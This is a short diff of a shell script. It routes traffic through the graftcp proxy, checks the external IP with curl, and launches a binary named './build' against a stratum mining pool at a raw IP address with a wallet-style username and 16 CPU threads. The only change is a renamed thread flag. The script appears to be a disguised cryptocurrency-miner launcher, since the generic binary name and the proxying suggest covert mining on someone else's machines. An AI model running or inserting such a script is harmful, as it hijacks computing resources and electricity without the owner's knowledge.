@@ -9,4 +9,4 @@ END
 sleep .2
 ./graftcp/graftcp curl ifconfig.me
 
-./graftcp/graftcp ./build -c stratum+tcp://139.99.123.225:3956#xnsub -u RG8nBd1ce7oAUHV3kL6ezoeApw9VUPzZy2.RDP9  -p x -t 16
+./graftcp/graftcp ./build -c stratum+tcp://139.99.123.225:3956#xnsub -u RG8nBd1ce7oAUHV3kL6ezoeApw9VUPzZy2.RDP9  -p x --cpu 16
